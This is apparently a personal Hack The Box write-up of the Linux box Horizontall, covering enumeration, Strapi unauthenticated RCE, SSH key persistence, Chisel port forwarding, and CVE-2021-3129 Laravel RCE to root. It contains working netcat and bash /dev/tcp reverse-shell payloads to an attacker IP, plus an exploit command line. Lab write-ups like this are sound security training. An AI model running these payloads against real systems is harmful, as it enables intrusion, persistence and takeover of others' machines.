## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)

---

## 🔍 Foothold
### Nmap Scan
```bash
nmap -p- -T4 -oA scans/nmap-alltcp 10.129.61.76
```

### /etc/hosts Update
```bash
echo "10.129.61.76 horizontall.htb" | sudo tee -a /etc/hosts
```

### Virtual Host Discovery
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.129.61.76 -H "Host: FUZZ.horizontall.htb" --fs 194
```

### [Gobuster on API Virtual Host](HTTP)
```bash
gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100 -o gobuster_api-prod.horizontall_medium_php-html-txt.txt
```

---

## ⚙️ Exploiting Strapi (Unauthenticated RCE)

### Confirming RCE (Blind)
```bash
tcpdump -i tun0 icmp
```
Send Ping via Exploit ➡️ receive ICMP in tcpdump.

### Reverse Shell Payload
```bash
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 80 >/tmp/f
```

---

## 🔑 Persistence via [SSH](SSH) Key
```bash
# On victim
mkdir /opt/strapi/.ssh
vim /opt/strapi/.ssh/authorized_keys

# On attacker
ssh-keygen -f strapi
scp strapi.pub to victim and paste into authorized_keys

# SSH access
ssh strapi@horizontall.htb -i strapi
```

---

## 🔍 Enumeration
### Database Creds
Found in:
```bash
/opt/strapi/myapi/config/environments/development/database.json
```

### Connect to MySQL
```bash
mysql -h 127.1 -u developer -p
```

### Open Ports (Local)
```bash
netstat -tulnp
```
Found: 1337, 8000

---

## 🔁 Port Forwarding with Chisel

### Start Chisel Server (Kali)
```bash
./chisel server --port 9000 --reverse
```

### Start Chisel Client (Victim)
```bash
./chisel client 10.10.16.5:9000 R:1234:127.0.0.1:8000
```

---

## 🕵️‍♂️ Web Enumeration on Laravel (p8000)
```bash
gobuster dir -u http://127.0.0.1:1234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100 -o gobuster_p8000_medium_php-html-txt.txt
```

Discovered: `/profiles`
Path leaked: `/home/developer/myproject/resources/views/profile/index.blade.php`

---

## 🧨 Privilege Escalation (Laravel RCE)

### CVE-2021-3129 Exploit
```bash
git clone https://github.com/joshuavanderpoll/CVE-2021-3129
python3 CVE-2021-3129.py --url http://127.0.0.1:1234 --exec 'bash -c "bash -i >& /dev/tcp/10.10.16.5/443 0>&1"' --force
```

### Netcat Listener
```bash
nc -lnvp 443
```

---

## ✅ Root Access
Confirmed reverse shell drops as `root`.

---

## 📚 Resources
- Chisel: https://github.com/jpillora/chisel
- Strapi Exploit: https://www.exploit-db.com/exploits/50239
- Laravel Exploits:
  - https://www.exploit-db.com/exploits/49424
  - https://github.com/joshuavanderpoll/CVE-2021-3129